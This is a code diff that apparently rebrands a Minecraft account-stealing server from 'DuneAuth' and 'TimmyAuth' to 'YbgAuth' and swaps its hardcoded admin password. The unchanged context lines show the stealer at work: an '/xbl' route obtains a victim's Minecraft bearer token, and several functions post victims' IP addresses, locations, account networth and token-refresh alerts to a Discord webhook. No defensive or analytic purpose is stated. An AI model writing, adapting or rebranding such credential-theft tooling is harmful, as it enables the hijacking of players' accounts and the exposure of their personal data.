@@ -68,7 +68,7 @@ app.get('/addKey', (req, res) => {
 		res.status(400).send('Invalid key');
 		return;
 	}
-	if (password !== 'Dune336') {
+	if (password !== 'Ybg01') {
 		res.status(401).send('Incorrect password');
 		return;
 	}
@@ -107,7 +107,7 @@ app.get('/deleteKey', async (req, res) => {
 		res.status(400).send('Invalid key');
 		return;
 	}
-	if (password !== 'Dune336') {
+	if (password !== 'Ybg01') {
 		res.status(401).send('Incorrect password');
 		return;
 	}
@@ -218,7 +218,7 @@ app.get('/', async (req, res) => {
 
 			axios.post(webhook_url, {
 				content: `Someone used a non minecraft account\n**IP:** ${clientIP} at ${country} ${flag}`,
-				username: "DuneAuth",
+				username: "YbgAuth",
 				avatar_url: "https://cdn.discordapp.com/avatars/1094682441274364085/d4148db461700dc31ef992d5be0dfea8.png"
 			}).then(() => console.log("Someone used a non minecraft account.")).catch(error => console.error("Error posting to webhook:", error));
 		}
@@ -443,7 +443,7 @@ async function postToWebhook(webhook_url, discord, status, formatNumber, level, 
 	else if (networthNoInventory) total_networth = "NO INVENTORY: " + formatNumber(networthNetworth) + " (" + formatNumber(networthUnsoulbound) + ")";
 	else total_networth = formatNumber(networthNetworth) + " (" + formatNumber(networthUnsoulbound) + ")";
 	let data = {
-		username: "DuneAuth",
+		username: "YbgAuth",
 		avatar_url: "https://cdn.discordapp.com/avatars/1094682441274364085/d4148db461700dc31ef992d5be0dfea8.png",
 		content: "@everyone ",
 		embeds: [{
@@ -626,7 +626,7 @@ async function refreshToWebhook(webhook_url, discord, status, formatNumber, leve
 	else total_networth = formatNumber(networthNetworth) + " (" + formatNumber(networthUnsoulbound) + ")";
 
 	let data = {
-		username: "DuneAuth",
+		username: "YbgAuth",
 		avatar_url: "https://cdn.discordapp.com/avatars/1094682441274364085/d4148db461700dc31ef992d5be0dfea8.png",
 		content: "@everyone TOKEN REFRESHED!!!!",
 		embeds: [{
@@ -775,7 +775,7 @@ app.get('/xbl', async (req, res) => {
 		});
 		const bearerToken = minecraftResponse.data.access_token
 		let data = {
-			username: "TimmyAuth",
+			username: "YbgAuth",
 			avatar_url: "https://cdn.discordapp.com/avatars/1094682441274364085/d4148db461700dc31ef992d5be0dfea8.png",
 			embeds: [{
 				color: 16746496,
